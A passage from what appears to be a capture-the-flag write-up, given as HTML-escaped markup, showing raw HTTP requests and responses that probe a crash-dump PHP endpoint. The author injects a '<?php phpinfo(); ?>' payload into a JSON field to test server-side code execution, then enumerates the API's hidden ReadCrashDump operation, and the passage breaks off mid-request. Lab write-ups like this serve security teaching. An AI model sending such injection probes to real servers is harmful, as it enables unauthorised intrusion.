android.view.ViewRootImpl.doTraversal(ViewRootImpl.java:1254)\n\tat android.view.ViewRootImpl$TraversalRunnable.run(ViewRootImpl.java:6337)\n\tat android.view.Choreographer$CallbackRecord.run(Choreographer.java:874)\n\tat android.view.Choreographer.doCallbacks(Choreographer.java:686)\n\tat android.view.Choreographer.doFrame(Choreographer.java:621)\n\tat android.view.Choreographer$FrameDisplayEventReceiver.run(Choreographer.java:860)\n\tat android.os.Handler.handleCallback(Handler.java:751)\n\tat android.os.Handler.dispatchMessage(Handler.java:95)\n\tat android.os.Looper.loop(Looper.java:154)\n\tat android.app.ActivityThread.main(ActivityThread.java:6119)\n\tat java.lang.reflect.Method.invoke(Native Method)\n\tat com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:886)\n\tat com.android.internal.os.ZygoteInit.main(ZygoteInit.java:776)\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;model&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Android SDK built for x86&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;sdkint&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;25&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;device&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;generic_x86&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;product&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sdk_google_phone_x86&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;lversion&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;3.10.0+&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmheapsz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;123054440&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmallocmem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;119010712&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmheapszlimit&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;536870912&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;natallocmem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;7198792&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;cpuusage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0.08108108&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;totalstor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1560133632&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;freestor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;120262656&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;busystor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1439870976&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;udid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;58bc60a3ff0f2f1a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I got this response from the server:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mon, 26 Dec 2016 22:19:50 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;81&lt;/span&gt;

{
    &amp;quot;success&amp;quot; : true,
    &amp;quot;folder&amp;quot; : &amp;quot;docs&amp;quot;,
    &amp;quot;crashdump&amp;quot; : &amp;quot;crashdump-WgyLFG.php&amp;quot;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, apparently, a file &lt;code&gt;docs/crashdump-WgyLFG.php&lt;/code&gt; was created. That's
very interesting, because this means that we may be able to upload valid
PHP code to be executed. The first thing I did was try to put PHP code in
the exception, to see if it was executed:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/exception.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;429&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;operation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;WriteCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;lmessage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Message.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;strace&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Stack trace&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;sdkint&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;25&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;device&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;generic_x86&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;product&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sdk_google_phone_x86&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;lversion&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;3.10.0+&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmheapsz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;123054440&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmallocmem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;119010712&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmheapszlimit&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;536870912&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;natallocmem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;7198792&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;cpuusage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0.08108108&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;totalstor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1560133632&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;freestor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;120262656&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;busystor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1439870976&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;udid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;58bc60a3ff0f2f1a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 15:27:39 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;81&lt;/span&gt;

{
    &amp;quot;success&amp;quot; : true,
    &amp;quot;folder&amp;quot; : &amp;quot;docs&amp;quot;,
    &amp;quot;crashdump&amp;quot; : &amp;quot;crashdump-yoerjb.php&amp;quot;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/docs/crashdump-yoerjb.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 15:28:33 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;488&lt;/span&gt;

{
    &amp;quot;message&amp;quot;: &amp;quot;&lt;span class="cp"&gt;&amp;lt;?php phpinfo(); ?&amp;gt;&lt;/span&gt;&amp;quot;,
    &amp;quot;lmessage&amp;quot;: &amp;quot;Message.&amp;quot;,
    &amp;quot;strace&amp;quot;: &amp;quot;Stack trace&amp;quot;,
    &amp;quot;sdkint&amp;quot;: &amp;quot;25&amp;quot;,
    &amp;quot;device&amp;quot;: &amp;quot;generic_x86&amp;quot;,
    &amp;quot;product&amp;quot;: &amp;quot;sdk_google_phone_x86&amp;quot;,
    &amp;quot;lversion&amp;quot;: &amp;quot;3.10.0+&amp;quot;,
    &amp;quot;vmheapsz&amp;quot;: &amp;quot;123054440&amp;quot;,
    &amp;quot;vmallocmem&amp;quot;: &amp;quot;119010712&amp;quot;,
    &amp;quot;vmheapszlimit&amp;quot;: &amp;quot;536870912&amp;quot;,
    &amp;quot;natallocmem&amp;quot;: &amp;quot;7198792&amp;quot;,
    &amp;quot;cpuusage&amp;quot;: &amp;quot;0.08108108&amp;quot;,
    &amp;quot;totalstor&amp;quot;: &amp;quot;1560133632&amp;quot;,
    &amp;quot;freestor&amp;quot;: &amp;quot;120262656&amp;quot;,
    &amp;quot;busystor&amp;quot;: &amp;quot;1439870976&amp;quot;,
    &amp;quot;udid&amp;quot;: &amp;quot;58bc60a3ff0f2f1a&amp;quot;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;No such luck, our code was not executed. By playing with other parameters, I
got this error message when I modified the &lt;code&gt;operation&lt;/code&gt; parameter:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/exception.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;419&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;operation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Test&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;lmessage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Message.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;strace&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Stack trace&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;sdkint&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;25&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;device&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;generic_x86&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;product&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sdk_google_phone_x86&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;lversion&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;3.10.0+&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmheapsz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;123054440&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmallocmem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;119010712&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmheapszlimit&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;536870912&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;natallocmem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;7198792&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;cpuusage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0.08108108&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;totalstor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1560133632&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;freestor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;120262656&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;busystor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1439870976&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;udid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;58bc60a3ff0f2f1a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 15:30:29 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;82&lt;/span&gt;

Fatal error! JSON key &amp;#39;operation&amp;#39; must be set to WriteCrashDump or ReadCrashDump.
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, so we can create crash dump file, but we can also read from them. Let's try
to read one. Since I don't know how this API function works, I tried creating
a valid &lt;code&gt;ReadCrashDump&lt;/code&gt; request by trial and error:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/exception.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;29&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;operation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ReadCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 15:33:00 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;42&lt;/span&gt;

Fatal error! JSON key &amp;#39;data&amp;#39; must be set.
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, a &lt;code&gt;data&lt;/code&gt; key must be set. Let's try this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/exception.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
